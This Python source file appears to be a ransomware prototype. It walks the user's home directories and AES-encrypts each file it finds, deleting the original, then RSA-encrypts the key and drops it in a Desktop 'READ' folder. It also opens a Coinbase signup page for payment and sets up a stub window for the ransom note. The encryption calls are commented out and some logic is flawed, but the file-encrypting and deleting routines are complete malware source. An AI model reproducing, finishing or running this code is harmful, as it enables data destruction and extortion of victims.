import Crypto, ast, os, sys, glob, socket, base64, hashlib, tkinter, webbrowser
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random
from os.path import expanduser
from GenAsymKeys import GenAsymKeys
import random
import time

#significant help on getting AES encryption to work from
#https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(enc)
    os.remove(file_name)

def decrypt(ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

def decrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)

#traversing the file system to encrypt files
def traverse_files(nwd, key, depth):
    # get list of files and directories in current directory
    search_dir = nwd + "/*"
    files = glob.glob(search_dir)
    # want to make sure there are files to encrypt or directories to search
    while files:
        for path in files:
            req1 = 'Home' in os.path.basename(os.path.normpath(path))
            req2 = 'home' in os.path.basename(os.path.normpath(path))
            req3 = 'HOME' in os.path.basename(os.path.normpath(path))

            if not os.path.isdir(path):
                print((depth*'  ') + "|F: " + os.path.basename(os.path.normpath(path)))
                encrypt_file(key, path)
                #time.sleep(10)
                #decrypt_file(key, path + ".enc")
            elif os.path.isdir(path) and not req2 and not req2 and not req3:
                print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
                traverse_files(path, key, depth + 1)
        files = []

def display_note():
    top = tkinter.Tk()
    # Code to add widgets will go here...
    top.mainloop()

def main():
    #getting the public key that was generated for this target
    f = open ("publicKey.txt", 'r')
    rsa_key = RSA.importKey(f.read())
    f.close()
    pub_key = rsa_key.publickey()

    #generate a random AES key, pass it to the traverse function which will
    #use it for encrypting individual files
    aes_key = os.urandom(32)

    #start from the home directory, pass it to the traverse function
    home = expanduser('~')
    cwd = home + '/TestFiles'
    print(cwd + "\n")
    #traverse_files(cwd, aes_key, 0)

    home = expanduser('~')
    cwd = home + '/Desktop'
    print(cwd + "\n")
    #traverse_files(cwd, aes_key, 0)

    encrypted_key = pub_key.encrypt(aes_key, 32)

    f = open ("privateKey.txt", 'r')
    rsa_key = RSA.importKey(f.read())
    f.close()

    home = expanduser('~')
    info_dir = home + '/Desktop/READ'
    if not os.path.exists(info_dir):
        os.makedirs(info_dir)

    f = open (info_dir + "/encryptedKey.txt", 'w')
    f.write(str(encrypted_key)) #write ciphertext to file
    f.close()

    webbrowser.open("https://www.coinbase.com/signup")

    display_note()

if __name__ == "__main__":
    main()
